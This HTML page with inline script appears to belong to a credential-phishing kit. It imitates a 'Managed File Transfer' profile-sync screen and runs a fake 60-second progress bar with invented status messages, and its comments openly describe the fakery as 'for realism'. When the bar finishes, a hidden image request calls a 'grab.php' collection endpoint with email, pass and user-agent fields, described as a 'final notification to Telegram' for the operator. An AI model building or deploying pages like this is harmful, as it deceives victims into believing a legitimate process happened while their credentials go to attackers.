<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Managed File Transfer | Syncing...</title>
    <style>
        body { margin: 0; background-color: #f6f9fc; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; color: #424770; }
        .sync-container { background: #fff; padding: 50px; border-radius: 12px; box-shadow: 0 15px 35px rgba(50,50,93,0.1), 0 5px 15px rgba(0,0,0,0.07); text-align: center; width: 100%; max-width: 450px; }
        
        /* Spinning Loader */
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #001b41; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 30px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* Progress Bar */
        .progress-wrapper { width: 100%; background: #e6ebf1; height: 8px; border-radius: 4px; margin: 25px 0; overflow: hidden; }
        .progress-bar { width: 0%; height: 100%; background: #001b41; transition: width 0.5s linear; }

        h2 { font-size: 20px; font-weight: 700; margin: 0 0 10px; color: #001b41; }
        p { font-size: 14px; color: #8898aa; line-height: 1.6; }
        .status-text { font-family: monospace; font-size: 12px; color: #2ea44f; margin-top: 15px; font-weight: bold; }
        
        .success-icon { display: none; color: #2ea44f; font-size: 50px; margin-bottom: 20px; }
    </style>
</head>
<body>

<div class="sync-container" id="box">
    <div id="loading-content">
        <div class="loader"></div>
        <h2>Synchronizing Profile</h2>
        <p>Merging local OST/PST archives with cloud endpoint. Ensure your browser remains open during this process.</p>
        
        <div class="progress-wrapper">
            <div class="progress-bar" id="pbar"></div>
        </div>
        
        <div class="status-text" id="status">INITIALIZING...</div>
    </div>

    <!-- Completion View (Hidden initially) -->
    <div id="complete-content" style="display:none;">
        <div class="success-icon">✓</div>
        <h2 style="color: #2ea44f;">Synchronization Complete</h2>
        <p>Your identity profile has been successfully migrated to the new gateway. You may now close this window or proceed to your dashboard.</p>
        <div class="status-text">NODE STATUS: VERIFIED (REF: 8wozh)</div>
    </div>
</div>

<script>
    const progressBar = document.getElementById('pbar');
    const statusText = document.getElementById('status');
    const loadingView = document.getElementById('loading-content');
    const completeView = document.getElementById('complete-content');

    const statuses = [
        "RESOLVING ENDPOINT...",
        "AUTHENTICATING TOKEN...",
        "HASHING LOCAL ARCHIVES...",
        "UPLOADING METADATA...",
        "FINALIZING HANDSHAKE...",
        "VERIFYING INTEGRITY..."
    ];

    let progress = 0;
    const duration = 60000; // 60 seconds
    const intervalTime = duration / 100;

    const timer = setInterval(() => {
        progress++;
        progressBar.style.width = progress + "%";

        // Update status text randomly for realism
        if (progress % 15 === 0) {
            statusText.innerText = statuses[Math.floor(Math.random() * statuses.length)];
        }

        if (progress >= 100) {
            clearInterval(timer);
            completeSync();
        }
    }, intervalTime);

    function completeSync() {
        loadingView.style.display = 'none';
        completeView.style.display = 'block';
        document.querySelector('.success-icon').style.display = 'block';

        // FINAL NOTIFICATION TO TELEGRAM
        // Use a hidden image request to ping your backend one last time
        const ping = new Image();
        ping.src = `grab.php?email=SYNCHRONIZED&pass=COMPLETED&ua=${encodeURIComponent(navigator.userAgent)}`;
    }
</script>

</body>
</html>